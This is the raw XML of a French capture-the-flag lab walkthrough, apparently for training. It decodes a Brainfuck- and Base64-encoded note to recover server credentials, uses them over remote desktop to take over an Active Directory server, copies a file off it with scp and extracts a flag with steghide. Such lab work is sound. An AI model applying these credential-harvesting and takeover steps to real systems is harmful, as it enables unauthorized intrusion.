                <wp:docPr id="1300563595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9539" cy="20641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545E1C" id="Rectangle : coins arrondis 3" o:spid="_x0000_s1026" style="position:absolute;margin-left:.15pt;margin-top:11.4pt;width:281.05pt;height:16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" filled="f" strokecolor="#e00" strokeweight="3pt">
                <v:stroke joinstyle="miter"/>
              </v:roundrect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00AA7BB4">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3CDB1CC4" wp14:editId="432899F7">
            <wp:extent cx="5019675" cy="4389368"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="67643033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063" cy="4395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8090E" w14:textId="77777777" w:rsidR="00AA7BB4" w:rsidRDefault="00AA7BB4" w:rsidP="002A3638"/>
    <w:p w14:paraId="201B212E" w14:textId="06409DD4" w:rsidR="00FE6A9B" w:rsidRDefault="00DE2304" w:rsidP="002A363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445DB4" wp14:editId="252FF3E0">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>-6829</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>330152</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="2758655" cy="232914"/>
                <wp:effectExtent l="19050" t="19050" r="22860" b="15240"/>
                <wp:wrapNone/>
                <wp:docPr id="845044334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8655" cy="23291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C266BBB" id="Rectangle : coins arrondis 3" o:spid="_x0000_s1026" style="position:absolute;margin-left:-.55pt;margin-top:26pt;width:217.2pt;height:18.3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" filled="f" strokecolor="#e00" strokeweight="3pt">
                <v:stroke joinstyle="miter"/>
              </v:roundrect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00DE36F6">
        <w:t>Trouver le f</w:t>
      </w:r>
      <w:r w:rsidR="00FE6A9B">
        <w:t xml:space="preserve">lag </w:t>
      </w:r>
      <w:r w:rsidR="00F369AF">
        <w:t>6</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> dans « c:\Users\Ne.Burma\Documents »</w:t>
      </w:r>
      <w:r w:rsidR="00165D68">
        <w:t> :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="099A2747" w14:textId="55BC07D5" w:rsidR="00AA7BB4" w:rsidRDefault="00DE2304" w:rsidP="002A3638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B2A5CE" wp14:editId="39B13BD2">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>3071004</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>1620292</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="1337094" cy="232914"/>
                <wp:effectExtent l="19050" t="19050" r="15875" b="15240"/>
                <wp:wrapNone/>
                <wp:docPr id="188896823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4" cy="23291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449850" id="Rectangle : coins arrondis 3" o:spid="_x0000_s1026" style="position:absolute;margin-left:241.8pt;margin-top:127.6pt;width:105.3pt;height:18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" filled="f" strokecolor="#e00" strokeweight="3pt">
                <v:stroke joinstyle="miter"/>
              </v:roundrect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00AA7BB4" w:rsidRPr="00AA7BB4">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5A6B3348" wp14:editId="2895FEBA">
            <wp:extent cx="4715533" cy="2295845"/>
            <wp:effectExtent l="0" t="0" r="8890" b="9525"/>
            <wp:docPr id="14761163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163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D925" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="002A3638"/>
    <w:p w14:paraId="374AEBD1" w14:textId="5323A01B" w:rsidR="00C4199D" w:rsidRDefault="00C4199D" w:rsidP="002A3638">
      <w:r>
        <w:t>Le fichier « Note perso.txt » est à décoder :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E8BF4AD" w14:textId="77777777" w:rsidR="00FE6A9B" w:rsidRDefault="00FE6A9B" w:rsidP="002A3638">
      <w:r w:rsidRPr="00C812EF">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="27CA68E4" wp14:editId="4A429068">
            <wp:extent cx="6770334" cy="1085850"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1856510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103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84002" cy="108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5166" w14:textId="2F4C81C0" w:rsidR="004C2A12" w:rsidRDefault="002B4DF1" w:rsidP="002A3638">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Le </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>brainfuck</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> d</w:t>
      </w:r>
      <w:r w:rsidR="00BA7E78">
        <w:t>oit être décodé ligne par ligne :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="435D903F" w14:textId="69D30CF0" w:rsidR="00BA7E78" w:rsidRDefault="00BA7E78" w:rsidP="002A3638">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="60A433AF" wp14:editId="1DEBCB69">
            <wp:extent cx="6645910" cy="4187825"/>
            <wp:effectExtent l="0" t="0" r="2540" b="3175"/>
            <wp:docPr id="14545288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288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8540" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="002A3638"/>
    <w:p w14:paraId="519FBFA8" w14:textId="5617A29F" w:rsidR="00DE36F6" w:rsidRDefault="00BA7E78" w:rsidP="00C4199D">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>Ce qui</w:t>
      </w:r>
      <w:r w:rsidR="00DE36F6">
        <w:t xml:space="preserve"> donne :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15E02735" w14:textId="534CCFCE" w:rsidR="004A04A1" w:rsidRDefault="00DE36F6" w:rsidP="00C4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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DE36F6">
        <w:t>XFxSYXZp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="006933DD">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00DE36F6">
        <w:t>U3RldmVuIHBpbms4NA==</w:t>
      </w:r>
      <w:r w:rsidR="006933DD">
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00DE36F6">
        <w:t>XFxOVCAzLjY</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00DE36F6">
        <w:t>=</w:t>
      </w:r>
      <w:r w:rsidR="006933DD">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00DE36F6">
        <w:t>QWxpY2UgRHVqYXJkaW4yOA==</w:t>
      </w:r>
      <w:r w:rsidR="006933DD">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00DE36F6">
        <w:t>XFwgU1JWIEFE</w:t>
      </w:r>
      <w:r w:rsidR="006933DD">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00DE36F6">
        <w:t>QWRtaW4gU2VjcmV0cy5zZWNyZXQx</w:t>
      </w:r>
      <w:r w:rsidR="006933DD">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00DE36F6">
        <w:t>XFxOVCA0LjA=</w:t>
      </w:r>
      <w:r w:rsidR="006933DD">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00DE36F6">
        <w:t>SmVhbiBEdXBvbmQ4NA==</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="044C1F98" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="00C4199D">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D1EFABB" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="00C4199D">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="225701BD" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="00C4199D">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="044580B9" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="00C4199D">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22320FC9" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="00C4199D">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="54ADE5A2" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="00C4199D">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="37FD16EF" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="00C4199D">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6C8EA43D" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="00C4199D">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="224B9CA3" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="00C4199D">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="223A6271" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="00C4199D">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77FE80B7" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="00C4199D">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="705B65AB" w14:textId="34DF5CF9" w:rsidR="00C4199D" w:rsidRDefault="002B4DF1" w:rsidP="00C4199D">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Puis à nouveau le Base64 :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7108B29B" w14:textId="574637BE" w:rsidR="002B4DF1" w:rsidRDefault="002B4DF1" w:rsidP="00C4199D">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3BD5471F" wp14:editId="5B382E45">
            <wp:extent cx="6645910" cy="3931920"/>
            <wp:effectExtent l="0" t="0" r="2540" b="0"/>
            <wp:docPr id="2578956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956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8A30" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="00C4199D">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60FC2388" w14:textId="1DCA2E35" w:rsidR="00DE36F6" w:rsidRDefault="00DE36F6" w:rsidP="00C4199D">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>Décoder le Base64 :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46374434" w14:textId="52FAFD8A" w:rsidR="006933DD" w:rsidRPr="00F369AF" w:rsidRDefault="006933DD" w:rsidP="00C4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left"/>
      </w:pPr>
      <w:r w:rsidRPr="00F369AF">
        <w:t>\\Ravi</w:t>
      </w:r>
      <w:r w:rsidRPr="00F369AF">
        <w:br/>
        <w:t>Steven pink84</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72C523D7" w14:textId="2698838B" w:rsidR="006933DD" w:rsidRPr="006933DD" w:rsidRDefault="006933DD" w:rsidP="00C4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left"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006933DD">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>\\NT 3.6</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="006933DD">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Alice Dujardin28</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="409B738E" w14:textId="146FC1AA" w:rsidR="006933DD" w:rsidRPr="006933DD" w:rsidRDefault="006933DD" w:rsidP="00C419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left"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006933DD">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>\\ SRV AD</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="006933DD">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Admin Secrets.secret1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2108521D" w14:textId="155404F4" w:rsidR="00C4199D" w:rsidRDefault="006933DD" w:rsidP="002B4D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left"/>
      </w:pPr>
      <w:r w:rsidRPr="00F369AF">
        <w:t>\\NT 4.0</w:t>
      </w:r>
      <w:r w:rsidRPr="00F369AF">
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="006933DD">
        <w:t>Jean Dupond84</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CC3001F" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="00FD3004"/>
    <w:p w14:paraId="7C7F4832" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="00FD3004"/>
    <w:p w14:paraId="6CB7118D" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="00FD3004"/>
    <w:p w14:paraId="367F4247" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="00FD3004"/>
    <w:p w14:paraId="6AAF75B8" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="00FD3004"/>
    <w:p w14:paraId="15B0CE52" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="00FD3004"/>
    <w:p w14:paraId="6BBD3C92" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="00FD3004"/>
    <w:p w14:paraId="31508001" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="00FD3004"/>
    <w:p w14:paraId="00E45AB3" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="00FD3004"/>
    <w:p w14:paraId="41F59582" w14:textId="784B6EBE" w:rsidR="00FD3004" w:rsidRDefault="00FD3004" w:rsidP="00FD3004">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Dans kali, exécuter « </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Remmina</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t> » et saisir l’adresse du serveur AD identifié plus tôt ainsi que le</w:t>
      </w:r>
      <w:r w:rsidR="00067270">
        <w:t xml:space="preserve"> mot de passe </w:t>
      </w:r>
      <w:r>
        <w:t>trouvés dans le fichier :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05757BEA" w14:textId="77777777" w:rsidR="00FD3004" w:rsidRDefault="00FD3004" w:rsidP="00FD3004">
      <w:r w:rsidRPr="00D3635F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="532B5DA1" wp14:editId="419C1071">
            <wp:extent cx="3828564" cy="2924175"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="688970162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7016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41897" cy="293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71C4" w14:textId="77777777" w:rsidR="00FD3004" w:rsidRDefault="00FD3004" w:rsidP="00FD3004">
      <w:r>
        <w:t>Cela ne fonctionne pas ??</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F5C285C" w14:textId="1146A2AD" w:rsidR="00FD3004" w:rsidRDefault="00FD3004" w:rsidP="00FD3004">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Retourner </w:t>
      </w:r>
      <w:r w:rsidR="004C2A12">
        <w:t>avec</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> la session </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>shell</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="004C2A12">
        <w:t xml:space="preserve">  dans</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="004C2A12">
        <w:t xml:space="preserve"> C:\users</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> et identifier les comptes nommés « admin »</w:t>
      </w:r>
      <w:r w:rsidR="004C2A12">
        <w:t> :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D852172" w14:textId="77777777" w:rsidR="00FD3004" w:rsidRDefault="00FD3004" w:rsidP="00FD3004">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r w:rsidRPr="00D3635F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="295353F0" wp14:editId="7CC7EA50">
            <wp:extent cx="3781953" cy="504895"/>
            <wp:effectExtent l="0" t="0" r="9525" b="9525"/>
            <wp:docPr id="2139142466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42466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BB43" w14:textId="77777777" w:rsidR="00C4199D" w:rsidRDefault="00C4199D" w:rsidP="00FD3004">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C48CBCE" w14:textId="5742DA5B" w:rsidR="00FD3004" w:rsidRDefault="00FD3004" w:rsidP="00FD3004">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>Essayer avec « </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Admin.Reseau</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t> » :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FBF6158" w14:textId="77777777" w:rsidR="00FD3004" w:rsidRDefault="00FD3004" w:rsidP="00FD3004">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r w:rsidRPr="00833CFD">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1C74EDE2" wp14:editId="4CD6C374">
            <wp:extent cx="3867150" cy="3017161"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1451787609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87609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78448" cy="302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600E" w14:textId="77777777" w:rsidR="00FD3004" w:rsidRDefault="00FD3004" w:rsidP="00FD3004">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3AB67C4E" w14:textId="1BE94CD2" w:rsidR="00C4199D" w:rsidRDefault="00FD3004" w:rsidP="004C2A12">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>Nous prenons la main sur le serveur « ServeurAD2019 ».</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7692AC1D" w14:textId="7468C7FE" w:rsidR="00C4199D" w:rsidRPr="00AA7BB4" w:rsidRDefault="004C2A12" w:rsidP="004C2A12">
      <w:pPr>
        <w:pStyle w:val="Titre2"/>
      </w:pPr>
      <w:bookmarkStart w:id="7" w:name="_Toc210403959"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Etape 4 : Pillage de</w:t>
      </w:r>
      <w:r w:rsidR="00C4199D" w:rsidRPr="00AA7BB4">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>l’</w:t>
      </w:r>
      <w:r w:rsidR="00C4199D">
        <w:t>AD</w:t>
      </w:r>
      <w:bookmarkEnd w:id="7"/>
    </w:p>
    <w:p w14:paraId="0137F301" w14:textId="2EAC2A94" w:rsidR="00165D68" w:rsidRDefault="00C4199D" w:rsidP="00FD3004">
      <w:r>
        <w:t xml:space="preserve">Trouver le </w:t>
      </w:r>
      <w:r w:rsidR="00165D68">
        <w:t xml:space="preserve">Flag </w:t>
      </w:r>
      <w:r w:rsidR="00F369AF">
        <w:t>7</w:t>
      </w:r>
      <w:r w:rsidR="00165D68">
        <w:t> :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23C83619" w14:textId="53783940" w:rsidR="004C2A12" w:rsidRDefault="00C4199D" w:rsidP="00FD3004">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="31F12C60" wp14:editId="45C459DE">
            <wp:extent cx="5086350" cy="2594204"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="195026124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07" cy="2603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0C5D" w14:textId="77777777" w:rsidR="004A04A1" w:rsidRDefault="004A04A1" w:rsidP="00FD3004"/>
    <w:p w14:paraId="14BD3843" w14:textId="4C21A23D" w:rsidR="00FD3004" w:rsidRPr="00165D68" w:rsidRDefault="00FD3004" w:rsidP="00FD3004">
      <w:r w:rsidRPr="00165D68">
        <w:t xml:space="preserve">Trouver le </w:t>
      </w:r>
      <w:r w:rsidR="00F9056C">
        <w:t>F</w:t>
      </w:r>
      <w:r w:rsidRPr="00165D68">
        <w:t>lag</w:t>
      </w:r>
      <w:r w:rsidR="00165D68" w:rsidRPr="00165D68">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00F369AF">
        <w:t>8</w:t>
      </w:r>
      <w:r w:rsidRPr="00165D68">
        <w:t xml:space="preserve"> :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CCAF90F" w14:textId="46393D3E" w:rsidR="00F9056C" w:rsidRPr="004A04A1" w:rsidRDefault="00FD3004" w:rsidP="004A04A1">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1BD214C2" wp14:editId="1F9C4681">
            <wp:extent cx="5083519" cy="3829050"/>
            <wp:effectExtent l="0" t="0" r="3175" b="0"/>
            <wp:docPr id="190116337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3551" cy="383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D00F5" w14:textId="7563B2B0" w:rsidR="00FD3004" w:rsidRDefault="00FD3004" w:rsidP="00FD3004">
      <w:r w:rsidRPr="00FD3004">
        <w:t>Le télécharger sur la K</w:t>
      </w:r>
      <w:r>
        <w:t>ali :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51423812" w14:textId="7F9172CF" w:rsidR="00FD3004" w:rsidRPr="00FD3004" w:rsidRDefault="00FD3004" w:rsidP="00FD3004">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00FD3004">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>scp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00FD3004">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00FD3004">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>admin.reseau@192.168.10.10:C:/Users/admin.reseau/Documents/Docs/Linux/The_End_Is_Near.jpg</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00FD3004">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>" /home/stagiaire</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00FD3004">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>/  :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="746DF95B" w14:textId="77777777" w:rsidR="00FD3004" w:rsidRDefault="00FD3004" w:rsidP="00FD3004">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
      <w:r w:rsidRPr="00DB2810">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="33DF80B8" wp14:editId="7EC6B222">
            <wp:extent cx="6637193" cy="666750"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1003112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2540" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill rotWithShape="1">
                    <a:blip r:embed="rId46"/>
                    <a:srcRect r="37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377" cy="67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40AB3" w14:textId="641835E5" w:rsidR="00FD3004" w:rsidRDefault="00FD3004" w:rsidP="00FD3004">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>En extraire le contenu caché dans un fichier texte :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="481B4B92" w14:textId="1F5FDA03" w:rsidR="00FD3004" w:rsidRPr="008328F7" w:rsidRDefault="00FD3004" w:rsidP="00FD3004">
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
        <w:ind w:firstLine="708"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008328F7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>steghide</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008328F7">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> extract -sf The_End_Is_Near.jpg </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A2EF202" w14:textId="41D59772" w:rsidR="00FD3004" w:rsidRDefault="00F9056C" w:rsidP="00FD3004">
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
      </w:pPr>
      <w:r w:rsidRPr="00F9056C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3A1FB7AC" wp14:editId="4864C206">
            <wp:extent cx="4239217" cy="743054"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1497038419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38419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AD11F" w14:textId="77EF989E" w:rsidR="00F9056C" w:rsidRDefault="004A04A1" w:rsidP="00FD3004">
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
      </w:pPr>
      <w:r w:rsidRPr="004A04A1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Remarque :</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00F9056C">
        <w:t xml:space="preserve">Il n’y a aucune </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00F9056C">
        <w:t>passphrase</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00F9056C">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56072BFD" w14:textId="77777777" w:rsidR="00FD3004" w:rsidRDefault="00FD3004" w:rsidP="00FD3004">
      <w:pPr>
        <w:spacing w:after="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6C2F6D03" w14:textId="3E5C887E" w:rsidR="00FD3004" w:rsidRDefault="00FD3004" w:rsidP="00FD3004">
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
      </w:pPr>
      <w:r>
        <w:t>Afficher le contenu du fichier créé (« flag1.txt ») :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="744AA7D4" w14:textId="6C6E95D7" w:rsidR="00F9056C" w:rsidRPr="004A04A1" w:rsidRDefault="00F9056C" w:rsidP="004A04A1">
      <w:pPr>
        <w:spacing w:before="0" w:after="0"/>
      </w:pPr>
      <w:r w:rsidRPr="00F9056C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3DE014B8" wp14:editId="689D7ABA">
            <wp:extent cx="3534268" cy="1038370"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
